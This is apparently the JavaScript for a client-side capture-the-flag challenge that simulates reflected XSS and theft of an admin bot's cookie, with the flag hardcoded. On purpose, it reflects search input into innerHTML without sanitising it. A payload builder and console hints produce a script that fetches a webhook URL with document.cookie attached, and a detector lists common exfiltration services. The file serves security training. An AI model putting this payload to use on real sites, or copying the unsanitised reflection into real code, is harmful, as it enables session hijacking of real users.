/* ═══════════════════════════════════════════════════════════════════
   FlagVault CTF — XSS Cookie Steal Challenge #03
   ─────────────────────────────────────────────
   HOW IT WORKS (CTF author notes):
   ─────────────────────────────────
   This is a fully client-side simulation of a Reflected XSS +
   Cookie Theft attack flow. Everything runs in the browser.

   1. SEARCH BOX  — Reflects the q= value straight into innerHTML
      (intentionally unsafe), so any <script> or <img onerror=>
      payload executes immediately.

   2. ADMIN BOT   — A simulated bot that "visits" the reported URL.
      It has a secret flag cookie. When the player reports a URL
      containing a cookie-steal payload (fetch/img to webhook),
      the bot "visits" it after a 3-second delay and the
      simulated webhook panel receives the flag cookie.

   3. WEBHOOK LOG — Simulated. Detects common XSS exfil patterns
      in the reported URL and shows a realistic incoming request
      entry with the flag cookie value exposed.

   FLAG: FlagVault{x55_st34l5_c00k135_l1k3_4_gh05t}
   ═══════════════════════════════════════════════════════════════════ */

'use strict';

/* ── Constants ── */
const FLAG        = 'FlagVault{x55_st34l5_c00k135_l1k3_4_gh05t}';
const ADMIN_COOKIE = `flag=${FLAG}; session=eyJhZG1pbiI6dHJ1ZX0=`;

/* ── Fake search database ── */
const SEARCH_DB = [
  { title: 'Employee Handbook 2024',        snippet: 'Guidelines for all FlagVault Corp employees...' },
  { title: 'VPN Setup Guide',               snippet: 'Instructions for connecting to the internal VPN...' },
  { title: 'Security Policy v3.2',          snippet: 'All staff must comply with the data handling policy...' },
  { title: 'Onboarding Checklist',          snippet: 'Steps to complete during your first week at FlagVault...' },
  { title: 'Internal Tools Documentation',  snippet: 'References for internal dashboards and APIs...' },
  { title: 'Bug Bounty Rules',              snippet: 'Scope and rules for reporting vulnerabilities...' },
];

/* ══════════════════════════════
   SEARCH — Reflected XSS Engine
══════════════════════════════ */
function doSearch() {
  const input   = document.getElementById('search-input');
  const val     = input.value;
  const area    = document.getElementById('search-results-area');
  const rqEl    = document.getElementById('reflected-query');
  const listEl  = document.getElementById('results-list');
  const urlBar  = document.getElementById('live-url');

  if (!val.trim()) return;

  // Update URL bar
  urlBar.textContent = `http://challenge.flagvault.local:8082/search?q=${encodeURIComponent(val)}`;

  // Show results area
  area.classList.remove('hidden');

  /* ── INTENTIONALLY UNSAFE reflection ──
     In a real app this would be server-side innerHTML injection.
     Here we simulate it client-side to demo the vulnerability.
  */
  rqEl.innerHTML = val;   // <-- THE VULNERABILITY: unsanitised reflection

  // Check what was injected and react
  const lower = val.toLowerCase();

  // alert() payload detection
  if (/alert\s*\(/i.test(val)) {
    const match = val.match(/alert\s*\(\s*['"]?([^'")\s]*)['"]?\s*\)/i);
    const alertVal = match ? match[1] || '1' : '1';
    showXSSAlert(`alert(${alertVal}) — XSS confirmed! Script executed in page context.`);
  }

  // confirm() / prompt()
  if (/confirm\s*\(/i.test(val) || /prompt\s*\(/i.test(val)) {
    showXSSAlert('confirm() / prompt() — XSS payload executed.');
  }

  // cookie steal patterns: fetch, XMLHttpRequest, img onerror, location
  if (
    /document\.cookie/i.test(val) ||
    /fetch\s*\(/i.test(val) ||
    /xmlhttprequest/i.test(val) ||
    /img.*onerror/i.test(val) ||
    /location\s*=/i.test(val) ||
    /new\s+image/i.test(val)
  ) {
    showXSSAlert(
      'Cookie exfiltration payload detected!\n' +
      'document.cookie = ' + ADMIN_COOKIE.substring(0, 40) + '...'
    );
    // Auto-fill the report URL field with the current payload URL
    const reportEl = document.getElementById('report-url');
    if (!reportEl.value) {
      reportEl.value = urlBar.textContent;
    }
  }

  // Build fake search results
  const results = SEARCH_DB.filter(r =>
    r.title.toLowerCase().includes(val.toLowerCase()) ||
    r.snippet.toLowerCase().includes(val.toLowerCase())
  );

  if (results.length === 0) {
    listEl.innerHTML = `<div class="no-results">// No results found for your query.</div>`;
  } else {
    listEl.innerHTML = results.map(r => `
      <div class="result-item">
        <div class="result-title">📄 ${r.title}</div>
        <div class="result-snippet">${r.snippet}</div>
      </div>
    `).join('');
  }
}

/* ── Update URL bar on type ── */
function updateUrlBar() {
  const val = document.getElementById('search-input').value;
  document.getElementById('live-url').textContent =
    `http://challenge.flagvault.local:8082/search?q=${encodeURIComponent(val)}`;
}

/* ── XSS Alert overlay ── */
function showXSSAlert(msg) {
  const overlay = document.getElementById('xss-alert-overlay');
  const msgEl   = document.getElementById('xss-alert-msg');
  msgEl.textContent = msg;
  overlay.classList.remove('hidden');
}
function closeXSSAlert() {
  document.getElementById('xss-alert-overlay').classList.add('hidden');
}

/* ══════════════════════════════
   ADMIN BOT SIMULATION
══════════════════════════════ */
let botBusy = false;

function submitToBot() {
  const urlInput = document.getElementById('report-url');
  const url      = urlInput.value.trim();
  const resultEl = document.getElementById('bot-result');

  if (!url) {
    showBotResult('safe', '[ ERROR ] Please enter a URL to report.');
    return;
  }

  if (botBusy) {
    showBotResult('visiting', '[ WAIT ] Admin bot is already processing a request...');
    return;
  }

  botBusy = true;
  setBotState('active', 'LOADING');
  showBotResult('visiting', '[ INFO ] URL submitted. Admin bot will visit in ~3 seconds...');

  setTimeout(() => {
    setBotState('visited', 'VISITING');
    showBotResult('visiting', '[ INFO ] Admin bot is visiting the URL...');

    setTimeout(() => {
      const leaked = detectCookieSteal(url);
      botBusy = false;

      if (leaked) {
        setBotState('leaked', 'PWNED');
        showBotResult('leaked', '[ ALERT ] XSS payload executed! Cookie exfiltrated to webhook!');
        addWebhookEntry(url, true);
      } else {
        setBotState('idle', 'IDLE');
        showBotResult('safe', '[ INFO ] Bot visited URL. No dangerous payload detected.');
        addWebhookEntry(url, false);
      }
    }, 2500);
  }, 3000);
}

/* ── Detect if the URL contains a cookie-stealing payload ── */
function detectCookieSteal(url) {
  const decoded = decodeURIComponent(url).toLowerCase();
  return (
    /document\.cookie/i.test(decoded) &&
    (
      /fetch\s*\(/i.test(decoded)   ||
      /xmlhttprequest/i.test(decoded)||
      /img.*onerror/i.test(decoded) ||
      /location\s*=/i.test(decoded) ||
      /new\s+image/i.test(decoded)  ||
      /webhook/i.test(decoded)      ||
      /requestbin/i.test(decoded)   ||
      /burp/i.test(decoded)         ||
      /ngrok/i.test(decoded)        ||
      /hookbin/i.test(decoded)
    )
  );
}

/* ── Bot state helpers ── */
function setBotState(state, label) {
  const dot  = document.getElementById('bot-dot');
  const text = document.getElementById('bot-status-text');
  dot.className = `bot-dot ${state}`;
  text.textContent = label;
}

function showBotResult(type, msg) {
  const el = document.getElementById('bot-result');
  el.className = `bot-result ${type}`;
  el.innerHTML = msg;
  el.classList.remove('hidden');
}

/* ══════════════════════════════
   WEBHOOK LOG
══════════════════════════════ */
let webhookCount = 0;

function addWebhookEntry(url, hasFlag) {
  const log = document.getElementById('webhook-log');

  // Remove empty placeholder
  const empty = log.querySelector('.webhook-empty');
  if (empty) empty.remove();

  webhookCount++;
  const now = new Date();
  const ts  = now.toISOString().replace('T',' ').substring(0,19);

  // Extract webhook destination from URL for display
  let dest = 'unknown';
  try {
    const decoded = decodeURIComponent(url);
    const fetchMatch = decoded.match(/fetch\s*\(\s*['"`]([^'"`]+)/i);
    const imgMatch   = decoded.match(/src\s*=\s*['"`]([^'"`]+)/i);
    if (fetchMatch) dest = fetchMatch[1].split('?')[0];
    else if (imgMatch) dest = imgMatch[1].split('?')[0];
    else dest = 'webhook.site/flagvault-sim';
  } catch { dest = 'webhook.site/flagvault-sim'; }

  const entry = document.createElement('div');
  entry.className = 'webhook-entry';

  if (hasFlag) {
    entry.innerHTML = `
      <div class="wh-time">[${ts}] REQUEST #${webhookCount}</div>
      <div><span class="wh-method">GET</span><span class="wh-url">${escHtml(dest)}</span></div>
      <div class="wh-cookie">Cookie: ${escHtml(ADMIN_COOKIE)}</div>
      <div class="wh-flag">🚩 FLAG EXTRACTED: ${FLAG}</div>
    `;
    // Reveal the cookie preview
    document.getElementById('cookie-value-display').textContent = FLAG;
    document.getElementById('cookie-value-display').style.color = 'var(--accent2)';
  } else {
    entry.innerHTML = `
      <div class="wh-time">[${ts}] REQUEST #${webhookCount}</div>
      <div><span class="wh-method">GET</span><span class="wh-url">${escHtml(dest.substring(0,60))}</span></div>
      <div style="color:var(--text-dim);font-size:0.68rem;margin-top:3px;">// No cookie exfiltration in payload</div>
    `;
  }

  log.insertBefore(entry, log.firstChild);
}

function clearWebhook() {
  document.getElementById('webhook-log').innerHTML =
    '<div class="webhook-empty">Log cleared.</div>';
  // Re-redact cookie
  document.getElementById('cookie-value-display').textContent = '██████████████████████████████';
  document.getElementById('cookie-value-display').style.color = '';
}

/* ══════════════════════════════
   PAYLOAD BUILDER TOOL
══════════════════════════════ */
function buildPayload() {
  const webhook = document.getElementById('webhook-input').value.trim();
  const output  = document.getElementById('payload-output');

  if (!webhook) {
    output.innerHTML = '<span style="color:var(--text-dim);">Enter your webhook URL above...</span>';
    return;
  }

  const script   = `<script>fetch('${webhook}?c='+document.cookie)<\/script>`;
  const encoded  = encodeURIComponent(script);
  const full     = `http://challenge.flagvault.local:8082/search?q=${encoded}`;

  output.textContent = full;
  // Auto-fill report URL
  document.getElementById('report-url').value = full;
}

function copyPayload() {
  const val   = document.getElementById('payload-output').textContent;
  const toast = document.getElementById('payload-copy-toast');
  if (!val || val.includes('Enter your webhook')) return;

  navigator.clipboard.writeText(val).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = val;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
  });

  toast.classList.remove('hidden');
  setTimeout(() => toast.classList.add('hidden'), 2000);
}

/* ══════════════════════════════
   HINTS
══════════════════════════════ */
function toggleHint(n) {
  const body   = document.getElementById(`hint${n}-body`);
  const toggle = document.getElementById(`hint${n}-toggle`);
  const hidden = body.classList.toggle('hidden');
  toggle.textContent = hidden ? '▼ Reveal' : '▲ Hide';
}

/* ══════════════════════════════
   FLAG SUBMISSION
══════════════════════════════ */
function submitFlag() {
  const input    = document.getElementById('flag-input').value.trim();
  const resultEl = document.getElementById('flag-result');
  const full     = `FlagVault{${input}}`;

  if (full === FLAG) {
    resultEl.className = 'submit-result correct';
    resultEl.innerHTML = '✓ &nbsp;Correct! Flag accepted. +300 pts';
  } else {
    resultEl.className = 'submit-result incorrect';
    resultEl.innerHTML = '✗ &nbsp;Incorrect flag. Keep trying.';
  }
}

/* ── Utility ── */
function escHtml(s) {
  return String(s)
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;');
}

/* ══════════════════════════════
   BOOT
══════════════════════════════ */
document.addEventListener('DOMContentLoaded', () => {

  // Enter key on search
  document.getElementById('search-input')?.addEventListener('keydown', e => {
    if (e.key === 'Enter') doSearch();
  });

  // Enter key on flag
  document.getElementById('flag-input')?.addEventListener('keydown', e => {
    if (e.key === 'Enter') submitFlag();
  });

  // Enter key on webhook builder
  document.getElementById('webhook-input')?.addEventListener('input', buildPayload);

  // Console hints
  console.log('%c🕷️  FlagVault CTF — XSS Cookie Steal', 'font-size:15px;font-weight:bold;color:#ff2d6b;');
  console.log('%cHint: The search box reflects input unsanitised. Try <script>alert(1)</script>', 'color:#f5a623;font-family:monospace;');
  console.log('%cHint: Steal cookies with fetch(webhookURL + "?c=" + document.cookie)', 'color:#00e8c8;font-family:monospace;');
  console.log('%cHint: Report the payload URL to the admin bot and watch the webhook log.', 'color:#b8cdd9;font-family:monospace;');
});
